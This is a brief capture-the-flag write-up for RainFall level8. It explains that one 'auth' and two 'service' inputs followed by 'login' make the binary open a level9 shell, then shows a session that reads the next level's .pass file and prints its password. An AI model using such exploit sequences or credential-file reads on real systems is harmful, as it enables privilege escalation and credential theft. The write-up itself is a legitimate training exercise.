For this one, we tried a few things. Looking into the source code, we managed to understand that we must put `auth ` or `service` to change the value of 2 addresses.
We must provide at least one of each, otherwise it will segfault when we try to `login`.
So we tried a few things, and it works with one `auth `  followed by two `service`.

> level8@RainFall:~$ ./level8 
> (nil), (nil)
> auth  
> 0x804a008, (nil) 
> service  
> 0x804a008, 0x804a018  
> service  
> 0x804a008, 0x804a028
> login 
> $ whoami 
> level9 
> $ cat /home/user/level9/.pass 
> c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a

